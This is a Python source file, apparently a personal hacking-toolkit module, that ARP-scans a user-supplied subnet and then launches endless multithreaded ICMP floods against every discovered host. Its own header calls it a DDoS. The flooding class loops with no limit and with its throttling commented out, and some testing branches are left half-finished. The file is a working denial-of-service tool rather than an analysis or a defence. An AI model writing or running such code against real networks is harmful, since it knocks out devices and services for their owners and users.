# THIS MODULE IS RESPONSIBLE FOR SENDING MASS ICMP PACKETS TO MULTIPLE NODES EFFECTIVELY RESULTING IN A DDOS


# UI IMPORTS
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
import pyfiglet
console = Console()



# NSM IMPORTS
from nsm_utilities import Utilities, NetTilities


# NETWORK IMPORTS
import socket, ipaddress
from scapy.all import ARP, ICMP, sendp, conf, ICMP, sr1, IP, send, ARP, Ether, srp, getmacbyip


# ETC IMPORTS
import threading, requests, time, random



# FILE IMPORTS
from pathlib import Path
import json



class Ping_Of_Death():
    """This Class will be responsible for housing logic that can perform mass ICMP flooding"""

    def __init__(self):
        self.packets_sent = 0
    
    
    def icmp(self, target_ip:str, count=20):
        """Create the ping packet"""

        
        # CREATE THE ICMP PACKET
        icmp = IP(dst=target_ip, src="192.168.1.38") / ICMP()
        

        # SEND THE ICMP PACKET
        while True:
            send(icmp, verbose=False, count=count)

            self.packets_sent += count

            console.print(f"Total Packets Sent: {self.packets_sent} to: {target_ip}")
             
            

            # FOR TESTING PURPOSES // DONT OVERLOAD THROUGHPUT / ROUTER
            #time.sleep(3)



class Network_Scanner():
    """This method will be responsible for finding active ips on the target network"""

    def __init__(self):
        
        self.network_ips = []
        self.network_macs = []

    
    @staticmethod
    def get_subnet():
        """This method will be responsible for getting and validating the users subnet"""

        while True:
            
            try:

                subnet = console.input("[bold red]Enter Subnet: ")

                valid_subnet = ipaddress.ip_network(subnet)

                return valid_subnet

            
            except (ipaddress.AddressValueError, ipaddress.NetmaskValueError) as e:
                console.print("[bold red]Subnet Error: [yellow]",e)

            
            except Exception as e:
                console.print("[bold red]Exception Error: [yellow]",e)

    
    
    # WARNING THIS CAN DRAW ALOT OF RESOURCES DEPENDING ON THE SUBNET SIZE PROCCEDD WITH CAUTION
    
    def threader(self, target):
        """ This method will be responsible for creating a parallel thread for each ip within the given subnet"""


        # CREATE VARIABLES
        threads = []
        num = 0


        subnet = [str(ip) for ip in Network_Scanner.get_subnet()]


        # ITERATE THROUGH SUBNET
        for ip in subnet:

            t = threading.Thread(target=target, args=(ip, ), daemon=True)
            threads.append(t)

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        
        
        # NOTIFY USER WHEN DONE // MORE LIKE DEBUGGING LOL
        console.print("[bold green]Network scan completed")

    
    def arp_scanner(self, ip):
        """This method will be responsible for arp scanning"""

        use = True
        
        if use:
        
            try: 
                # CRAFT AND SEND LAYER 2 PACKET
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ip))

                response = srp(arp, verbose=False, timeout=3)[0]
                
                for sent, recv in response:
                        
                    # EXTRACT DATA FROM PACKET
                    target_ip = recv.psrc
                    target_mac = recv.hwsrc

                    console.print(target_ip, target_mac)
                    

                    # APPEND ACTIVE IP AND MAC TO lIST
                    self.network_ips.append(target_ip)
                    self.network_macs.append(target_mac)
            
            except Exception as e:
                console.print(e)
        

        else:

            console.print("debugginggggggggggggggggggg")



    def tester(self):
        """This is just to get testing output for module testing"""


        console.print(
            f"\n\nTotal Devices found: {len(self.network_ips)}",
            f"Network IPS: {self.network_ips}",
            f"Network MACS: {self.network_macs}"
            
                      )
        

        # NOW TO RETURN THE FOUND IPS AND MACS
        return self.network_ips, self.network_macs
    
    
    @staticmethod
    def main():
        """This method will be responsible for calling class wide logic"""

        scanner = Network_Scanner()

        scanner.threader(target=scanner.arp_scanner)
        ips, macs = scanner.tester()


        # RETURN INFO TO MODULE CLASS
        return ips, macs



class Network_ICMP_Scanner():
    """This will perform a network wide scan using ICMP packets instead of ARP"""

    def __init__(self):
        self.map = Network_Scanner()
        pass


    def icmp(self, target_ip: str):
        """This is where we will create and send the icmp packet"""

        response = False
        
        icmp = IP(dst=target_ip) / ICMP()
         
        try:
            conf.verb = 0
            response = sr1(icmp, verbose=0, timeout=1.5)

            if response:
                console.print(f"[bold blue]IP:[/bold blue] {target_ip} is [bold green]Online")
        
        except Exception as e:
            console.print(e)

    

    def tcp(self, target_ip):
        """This method will make a tcp connection"""
       
        target_port = 25

        thread_id = threading.current_thread().name
        active_threads = threading.active_count()
        console.print(f"On thread: {thread_id} Thread count: {active_threads}")


        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

                s.settimeout(2)

                result = s.connect_ex((target_ip, target_port))
                

                if result == 0:
                    console.print(f"Target IP: {target_ip} is [bold green]Online")


                    time.sleep(2)



        except Exception as e:
            console.print(e)

    
    def threader(self):
        """This will be responsible for creating a thread for each ip in the subnet"""

        threads = [] 
        subnet = [str(ip) for ip in Network_Scanner.get_subnet()]
        
        try:
            for ip in subnet:
                
                t = threading.Thread(target=self.map.arp_scanner, args=(ip, ), daemon=True)
                #t = threading.Thread(target=self.icmp, args=(ip, ), daemon=True)
                #t = threading.Thread(target=self.tcp, args=(ip, ), daemon=True)
                #console.print(ip)

                threads.append(t)

            
            for thread in threads:
                
                thread.start()
                
            
            for thread in threads:
                thread.join()


            self.map.tester()
            console.input("\n\n\nExit to Enter: ")
        
        except Exception as e:
            console.print(e)
            time.sleep(2)



class Module_Controller():
    """This class will combine logic from both classes to work seamlessly"""

    def __init__(self):
        pass
    


    @staticmethod
    def main():
        """Begin"""

        use = 1

        # GET ACTIVE IPS ALONG WITH THERE MACS
        if use == 1:
            ips, macs = Network_Scanner.main()
            ping_o = Ping_Of_Death()
             
            console.print("starting ping of death")
            
            threads =  []
           
            try:
                for ip in ips:
                    t = threading.Thread(target=Ping_Of_Death().icmp, args=(ip, ), daemon=True)
                    threads.append(t)

                for thread in threads:
                    thread.start()
                
                for thread in threads:
                    thread.join()
            
            except KeyboardInterrupt as e:
                console.print(e)

            
            except Exception as e:
                console.print(e)
        
        elif use == 2:
            Network_ICMP_Scanner().threader()


        elif use == 3:
            devices = ["192.168.1.1", "192.168.1.38", "192.168.1.92", "192.168.1.161", "192.168.1.113"]

            for d in devices:
    
                Network_ICMP_Scanner().icmp(target_ip=d )


# STRICTLY FOR MODULE TESTING
if __name__ == "__main__":

    use = 3

    if use == 1:
        ips = [ip.strip() for ip in Network_Scanner.get_subnet()]
        for ip in ips:
            Network_Scanner.arp_scanner
    

    elif use == 2:
        Network_Scanner().main()
    

    elif use == 3:
        Network_ICMP_Scanner().threader()
    







